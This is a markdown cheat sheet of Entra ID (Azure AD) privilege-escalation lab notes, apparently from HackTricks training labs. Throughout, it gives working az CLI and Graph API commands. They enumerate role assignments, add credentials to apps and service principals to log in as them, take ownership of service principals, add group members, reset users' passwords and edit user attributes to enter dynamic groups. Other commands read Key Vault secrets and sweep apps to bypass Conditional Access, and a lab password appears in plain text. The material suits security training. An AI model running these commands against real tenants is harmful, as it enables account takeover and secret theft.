# Entra ID

```sh
# List enabled built-in Entra ID roles
az rest --method GET --uri "https://graph.microsoft.com/v1.0/directoryRoles"

# List all Entra ID roles with their permissions (including custom roles)
az rest --method GET --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions"

# List only custom Entra ID roles
az rest --method GET --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions" | jq '.value[] | select(.isBuiltIn == false)'

# List all assigned Entra ID roles
az rest --method GET --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments"

# List members of a Entra ID roles
az rest --method GET --uri "https://graph.microsoft.com/v1.0/directoryRoles/<role-id>/members"
```

## Labs

### microsoft.directory/applications/credentials/update

Enumerate assignment for a specific user :

```sh
curl -X GET "https://graph.microsoft.com/beta/rolemanagement/directory/transitiveRoleAssignments?\$count=true&\$filter=principalId%20eq%20'<user_id>'" \
-H "Authorization: Bearer $TOKEN" \
-H "ConsistencyLevel: eventual" \
-H "Content-Type: application/json" | jq
```

Get role detail:

```sh
curl -X GET "https://graph.microsoft.com/beta/roleManagement/directory/roleDefinitions/<role_id>" \
-H "Authorization: Bearer $TOKEN" \
-H "Content-Type: application/json" | jq
```

Exploit role:

```sh
# Get application information
az ad app show --id

# Add secret to the application
az ad app credential reset --id 6291eaf4-9e40-4ffc-be9b-fd02b9f7c241 --append

# Log as the app
az login --service-principal -u d8911518-0ebd-4cde-a75b-ebf7a8d36ede -t fdd066e1-ee37-49bc-b08f-d0e152119b04 -p <password>
```

Check Keyvault content:

```sh
# List keyvaults
az keyvault show -n entra-id-1-d090e49d50 -g entra-id-labs

# List secrets in keyvault
az keyvault secret list --vault-name entra-id-1-d090e49d50

# Get specific secret
az keyvault secret show --vault-name entra-id-1-d090e49d50 --name entra-id-1-d090e49d-50127
```

## microsoft.directory/servicePrincipals/owners/update

Enumerate users:

```sh
az ad user show --id entra_id_lab_2_start_point-d090e49d@azure.training.hacktricks.xyz
```

Get assigment and role details:

```sh
curl -k -X GET "https://graph.microsoft.com/beta/rolemanagement/directory/transitiveRoleAssignments?\$count=true&\$filter=principalId%20eq%20'<user_id>'" \
-H "Authorization: Bearer $TOKEN" \
-H "ConsistencyLevel: eventual" \
-H "Content-Type: application/json" | jq

curl -k -X GET "https://graph.microsoft.com/beta/roleManagement/directory/roleDefinitions/<role_id>" \
-H "Authorization: Bearer $TOKEN" \
-H "Content-Type: application/json" | jq
```

User has `microsoft.directory/servicePrincipals/owners/update` assignment => update owner of the service principal then add secret:

```sh
# Update owner
spId="<spId>"
userId="<userId>"
az rest --method POST \
  --uri "https://graph.microsoft.com/v1.0/servicePrincipals/$spId/owners/\$ref" \
  --headers \"Content-Type=application/json" \
  --body "{
    \"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
  }"


# Get application information
az ad sp show --id

# Add secret to the application
az ad sp credential reset --id <sp-id> --append

# Log as the app
az login --service-principal -u d8911518-0ebd-4cde-a75b-ebf7a8d36ede -t fdd066e1-ee37-49bc-b08f-d0e152119b04 -p <password>
```

## microsoft.directory/groups/members/update

Add member to group:

```sh
az ad group member add -g 9edc9437-3d1a-434f-9c57-9f06c3defc7f --member-id fb8e3b8b-a034-4dba-921d-0b90effac290
```

## Help Desk role

Reset password of a member of specific Administrative Unit:

```sh
az rest --method GET --uri "https://graph.microsoft.com/v1.0/directory/administrativeUnits/<au-id>/members"

az ad user update --id <user-id> --password '!Test123'
```

## Dynamic group privilege escalation

User has "microsoft.directory/users/basic/update" role over an AU containing himself

```sh
# List dynamic groups
az ad group list --query "[?contains(groupTypes, 'DynamicMembership')]" --output table

# "membershipRule": "user.otherMails -any _ -contains \"security\""
az rest --method PATCH \
  --uri "https://graph.microsoft.com/v1.0/users/<victimUser>" \
  --headers "Content-Type=application/json" \
  --body "{\"otherMails\": \"security@ht.co\"}"
```

Use [AzureAppsSweep](https://github.com/carlospolop/AzureAppsSweep) to check if user can login on different applications:

```sh
python3 ./AzureAppsSweep.py --username entra_id_lab_6_start_point-d090e49d@azure.training.hacktricks.xyz --password 'TOiX25I3W!!pZBY$' --outfile ./bypass_ca.txt
```
